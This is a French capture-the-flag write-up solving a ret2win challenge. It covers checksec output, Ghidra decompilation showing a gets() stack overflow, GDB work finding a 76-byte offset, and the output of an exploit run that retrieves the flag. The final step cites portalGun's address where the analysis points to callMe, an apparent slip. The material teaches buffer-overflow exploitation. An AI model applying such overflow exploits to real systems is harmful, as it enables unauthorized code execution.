# Pwn0x01

```md
return to win!!!

nc 35.180.44.229 1235
```

On comprends à la description qu'il va s'agir d'un ret2win. [L'exécutable](./task_new) est fournit vérifions si des sécurités sont activées :

```console
$ checksec --file=task_new
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   77 Symbols	  No	0		3	task_new
```

Visiblement pas de PIE ni de canary, essayons le :

```console
$ ./task_new 
hey Morty give an adress for my portal Gun
AAAA
```

Le programme nous demande une saisie et s'arrête, essayons de le reverse pour mieux le comprendre.

## Analyse statique

Avec Ghidra on retrouve ces trois fonctions :

```C
undefined4 main(void)
{
  ignore_me_init_buffering(&stack0x00000004);
  setvbuf(_stdout,(char *)0x0,2,0);
  puts("hey Morty give an adress for my portal Gun");
  portalGun();
  return 0;
}
```

```C
void portalGun(void)
{
  char local_4c [68];
  
  gets(local_4c);
  return;
}
```

```C
void callMe(int param_1)
{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("No flag contact an admin.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  if (param_1 == L'\xdeadbeef') {
    fgets(local_50,64,local_10);
    printf(local_50);
  }
  return;
}
```

La fonction `main` ne nous intéresse pas trop elle ne fait qu'appeler `portalGun`, qui elle par contre est vulnérable à un buffer overflow :

```C
  char local_4c [68];
  
  gets(local_4c);
```

Et enfin `callMe` va gentillement aller chercher le flag pour nous :

```C
  local_10 = fopen("flag.txt","r");
```

Puis nous l'affiche à condition de l'appeler avec `0xdeadbeef` en argument :

```C
  if (param_1 == L'\xdeadbeef') {
    fgets(local_50,64,local_10);
    printf(local_50);
  }
```

Il va donc falloir utiliser le buffer overflow de `portalGun` pour appeler `callMe` avec le bon argument.

## Analyse dynamique

Cherchons l'offset nécessaire pour rediriger l'exécution du programme sous GDB :

```gdb
gef➤  disas portalGun 
Dump of assembler code for function portalGun:
   0x080486a5 <+0>:	push   ebp
   0x080486a6 <+1>:	mov    ebp,esp
   0x080486a8 <+3>:	push   ebx
   0x080486a9 <+4>:	sub    esp,0x44
   0x080486ac <+7>:	call   0x8048729 <__x86.get_pc_thunk.ax>
   0x080486b1 <+12>:	add    eax,0x194f
   0x080486b6 <+17>:	sub    esp,0xc
   0x080486b9 <+20>:	lea    edx,[ebp-0x48]
   0x080486bc <+23>:	push   edx
   0x080486bd <+24>:	mov    ebx,eax
   0x080486bf <+26>:	call   0x8048430 <gets@plt>
   0x080486c4 <+31>:	add    esp,0x10
   0x080486c7 <+34>:	nop
   0x080486c8 <+35>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080486cb <+38>:	leave
   0x080486cc <+39>:	ret
End of assembler dump.

gef➤  br *portalGun+39
Breakpoint 1 at 0x80486cc

gef➤  r <<< $(python3 -c 'print("A"*76+"B"*4)')
```

```gdb
──────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
──────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "task_new", stopped 0x42424242 in ?? (), reason: SIGSEGV
```

Le programme crash car il n'arrive pas à accèder à l'adresse que nous avons injecter : il faudra un offset de 76 bytes.

## Exploit

PIE est désactivé nous pouvons donc utiliser cette addresse de `portalGun` :

```console
gef➤  info func portalGun
All functions matching regular expression "portalGun":

Non-debugging symbols:
0x080486a5  portalGun
```

Et ce [script](./exploit.py) nous permet d'envoyer notre payload à l'aide `pwntools` :

```console
$ python3 exploit.py 
[+] Opening connection to 35.180.44.229 on port 1235: Done

b'StarHack{YOU_WON!!}\n'

[*] Closed connection to 35.180.44.229 port 1235
```